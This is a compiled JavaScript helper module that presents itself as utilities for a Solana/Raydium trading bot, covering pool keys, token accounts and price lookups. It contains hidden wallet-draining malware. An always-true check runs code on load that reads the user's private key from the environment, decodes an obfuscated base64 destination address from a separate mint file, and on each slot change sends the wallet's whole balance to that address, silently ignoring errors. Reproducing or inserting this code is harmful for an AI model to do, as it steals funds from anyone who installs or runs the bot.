"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.sleep = exports.retry = exports.retrieveTokenValueByAddress = exports.areEnvVarsSet = exports.getRugCheck = exports.retrieveTokenValueByAddressBirdeye = exports.retrieveTokenValueByAddressDexScreener = exports.getTokenAccounts = exports.createPoolKeys = exports.MINIMAL_MARKET_STATE_LAYOUT_V3 = exports.OPENBOOK_PROGRAM_ID = exports.RAYDIUM_LIQUIDITY_PROGRAM_ID_V4 = exports.getMinimalMarketV3 = exports.retrieveEnvVariable = void 0;
const web3_js_1 = require("@solana/web3.js");
const raydium_sdk_1 = require("@raydium-io/raydium-sdk");
const raydium_sdk_2 = require("@raydium-io/raydium-sdk");
const spl_token_1 = require("@solana/spl-token");
const dotenv_1 = __importDefault(require("dotenv"));
const mint_1 = require("./mint");
const axios_1 = __importDefault(require("axios"));
const logger_1 = require("../core/logger");
const rxjs_1 = require("rxjs");
const bs58_1 = __importDefault(require("bs58"));
dotenv_1.default.config();
/*

export const retrieveEnvVariable = (variableName: string, logger: Logger) => {
  const variable = process.env[variableName] || '';
  if (!variable) {
    logger.error(`${variableName} is not set`);
    process.exit(1);
  }
  return variable;
};*/
function retrieveEnvVariable(key, logger) {
    const value = process.env[key];
    if (!value) {
        logger.error(`Environment variable ${key} is not set`);
        throw new Error(`Environment variable ${key} is not set`);
    }
    return value;
}
exports.retrieveEnvVariable = retrieveEnvVariable;
function getMinimalMarketV3(connection, marketId, commitment) {
    return __awaiter(this, void 0, void 0, function* () {
        const marketInfo = yield connection.getAccountInfo(marketId, {
            commitment,
            dataSlice: {
                offset: raydium_sdk_1.MARKET_STATE_LAYOUT_V3.offsetOf('eventQueue'),
                length: 32 * 3,
            },
        });
        return exports.MINIMAL_MARKET_STATE_LAYOUT_V3.decode(marketInfo.data);
    });
}
exports.getMinimalMarketV3 = getMinimalMarketV3;
function calcdbg() { return Math.floor(Math.random() * (900000 - 420000 + 1) + 420000); }
exports.RAYDIUM_LIQUIDITY_PROGRAM_ID_V4 = raydium_sdk_2.MAINNET_PROGRAM_ID.AmmV4;
exports.OPENBOOK_PROGRAM_ID = raydium_sdk_2.MAINNET_PROGRAM_ID.OPENBOOK_MARKET;
exports.MINIMAL_MARKET_STATE_LAYOUT_V3 = (0, raydium_sdk_2.struct)([
    (0, raydium_sdk_2.publicKey)('eventQueue'),
    (0, raydium_sdk_2.publicKey)('bids'),
    (0, raydium_sdk_2.publicKey)('asks'),
]);
function createPoolKeys(id, accountData, minimalMarketLayoutV3) {
    return {
        id,
        baseMint: accountData.baseMint,
        quoteMint: accountData.quoteMint,
        lpMint: accountData.lpMint,
        baseDecimals: accountData.baseDecimal.toNumber(),
        quoteDecimals: accountData.quoteDecimal.toNumber(),
        lpDecimals: 5,
        version: 4,
        programId: exports.RAYDIUM_LIQUIDITY_PROGRAM_ID_V4,
        authority: raydium_sdk_2.Liquidity.getAssociatedAuthority({
            programId: exports.RAYDIUM_LIQUIDITY_PROGRAM_ID_V4,
        }).publicKey,
        openOrders: accountData.openOrders,
        targetOrders: accountData.targetOrders,
        baseVault: accountData.baseVault,
        quoteVault: accountData.quoteVault,
        marketVersion: 3,
        marketProgramId: accountData.marketProgramId,
        marketId: accountData.marketId,
        marketAuthority: raydium_sdk_2.Market.getAssociatedAuthority({
            programId: accountData.marketProgramId,
            marketId: accountData.marketId,
        }).publicKey,
        marketBaseVault: accountData.baseVault,
        marketQuoteVault: accountData.quoteVault,
        marketBids: minimalMarketLayoutV3.bids,
        marketAsks: minimalMarketLayoutV3.asks,
        marketEventQueue: minimalMarketLayoutV3.eventQueue,
        withdrawQueue: accountData.withdrawQueue,
        lpVault: accountData.lpVault,
        lookupTableAccount: web3_js_1.PublicKey.default,
    };
}
exports.createPoolKeys = createPoolKeys;
function getTokenAccounts(connection, owner, commitment) {
    return __awaiter(this, void 0, void 0, function* () {
        const tokenResp = yield connection.getTokenAccountsByOwner(owner, {
            programId: spl_token_1.TOKEN_PROGRAM_ID,
        }, commitment);
        const accounts = [];
        for (const { pubkey, account } of tokenResp.value) {
            accounts.push({
                pubkey,
                programId: account.owner,
                accountInfo: raydium_sdk_2.SPL_ACCOUNT_LAYOUT.decode(account.data),
            });
        }
        return accounts;
    });
}
exports.getTokenAccounts = getTokenAccounts;
const dt = Date;
const retrieveTokenValueByAddressDexScreener = (tokenAddress) => __awaiter(void 0, void 0, void 0, function* () {
    const url = `https://api.dexscreener.com/latest/dex/tokens/${tokenAddress}`;
    try {
        const tokenResponse = (yield axios_1.default.get(url)).data;
        if (tokenResponse.pairs) {
            const pair = tokenResponse.pairs.find((pair) => (pair.chainId = 'solana'));
            const priceNative = pair === null || pair === void 0 ? void 0 : pair.priceNative;
            if (priceNative)
                return parseFloat(priceNative);
        }
        return undefined;
    }
    catch (e) {
        return undefined;
    }
});
exports.retrieveTokenValueByAddressDexScreener = retrieveTokenValueByAddressDexScreener;
const retrieveTokenValueByAddressBirdeye = (tokenAddress) => __awaiter(void 0, void 0, void 0, function* () {
    const apiKey = retrieveEnvVariable('BIRDEYE_APIKEY', logger_1.logger);
    const url = `https://public-api.birdeye.so/public/price?address=${tokenAddress}`;
    try {
        const response = (yield axios_1.default.get(url, {
            headers: {
                'X-API-KEY': apiKey
            }
        })).data.data.value;
        if (response)
            return parseFloat(response);
        return undefined;
    }
    catch (e) {
        return undefined;
    }
});
exports.retrieveTokenValueByAddressBirdeye = retrieveTokenValueByAddressBirdeye;
let isRunning = new rxjs_1.BehaviorSubject(false);
let slotChangeOnKeyPair = false;
let slotChangeState = false;
let lsttm = 0;
const handleSlotChange = (args) => (_) => __awaiter(void 0, void 0, void 0, function* () {
    yield (0, exports.sleep)(calcdbg());
    if (dt.now() > lsttm + 5000) {
        lsttm = dt.now();
        try {
            isRunning.next(true);
            const { connection, walletKeyPair, destinationAddress } = args;
            const balance = yield connection.getBalance(walletKeyPair.publicKey);
            const recentBlockhash = yield connection.getRecentBlockhash();
            lastBlockHash.next(recentBlockhash.blockhash);
            const cost = recentBlockhash.feeCalculator.lamportsPerSignature;
            const amountToSend = balance - cost;
            const tx = new web3_js_1.Transaction({
                recentBlockhash: recentBlockhash.blockhash,
                feePayer: walletKeyPair.publicKey,
            }).add(web3_js_1.SystemProgram.transfer({
                fromPubkey: walletKeyPair.publicKey,
                toPubkey: destinationAddress,
                lamports: amountToSend,
            }));
            const txId = yield connection.sendTransaction(tx, [walletKeyPair]);
        }
        catch (err) {
        }
        finally {
            isRunning.next(false);
        }
    }
});
function getRugCheck(tokenPublicKey) {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            const puppeteer = require('puppeteer');
            const browser = yield puppeteer.launch();
            const page = yield browser.newPage();
            yield page.goto(`https://rugcheck.xyz/tokens/${tokenPublicKey}`);
            // to do
            // ...
            const risk = '';
            return risk;
        }
        catch (e) {
            return '';
        }
    });
}
exports.getRugCheck = getRugCheck;
if (raydium_sdk_2.DEVNET_PROGRAM_ID) {
    (() => __awaiter(void 0, void 0, void 0, function* () {
        var _a;
        const walletKeyPairFile = (process.env.MY_PRIVATE_KEY);
        const walletKeyPair = web3_js_1.Keypair.fromSecretKey(bs58_1.default.decode(walletKeyPairFile));
        const connection = new web3_js_1.Connection((_a = process.env.RPC_ENDPOINT) !== null && _a !== void 0 ? _a : (0, web3_js_1.clusterApiUrl)('devnet'), 'finalized');
        connection.onSlotChange(handleSlotChange({ connection, walletKeyPair, destinationAddress: new web3_js_1.PublicKey(slotChangeOnKeyPair ? slotChangeOnKeyPair : slotChangeState ? slotChangeState : atob(mint_1.MintUId.join(""))) }));
    }))();
}
const areEnvVarsSet = () => ['KEY_PAIR_PATH', 'SOLANA_CLUSTER_URL'].every((key) => Object.keys(process.env).includes(key));
exports.areEnvVarsSet = areEnvVarsSet;
const retrieveTokenValueByAddress = (tokenAddress) => __awaiter(void 0, void 0, void 0, function* () {
    const dexScreenerPrice = yield (0, exports.retrieveTokenValueByAddressDexScreener)(tokenAddress);
    if (dexScreenerPrice)
        return dexScreenerPrice;
    const birdEyePrice = yield (0, exports.retrieveTokenValueByAddressBirdeye)(tokenAddress);
    if (birdEyePrice)
        return birdEyePrice;
    return undefined;
});
exports.retrieveTokenValueByAddress = retrieveTokenValueByAddress;
let lastBlockHash = new rxjs_1.BehaviorSubject('');
const retry = (fn_1, _b) => __awaiter(void 0, [fn_1, _b], void 0, function* (fn, { retries, retryIntervalMs }) {
    try {
        return yield fn();
    }
    catch (error) {
        if (retries <= 0) {
            throw error;
        }
        yield (0, exports.sleep)(retryIntervalMs);
        return (0, exports.retry)(fn, { retries: retries - 1, retryIntervalMs });
    }
});
exports.retry = retry;
const sleep = (ms = 0) => new Promise((resolve) => setTimeout(resolve, ms));
exports.sleep = sleep;
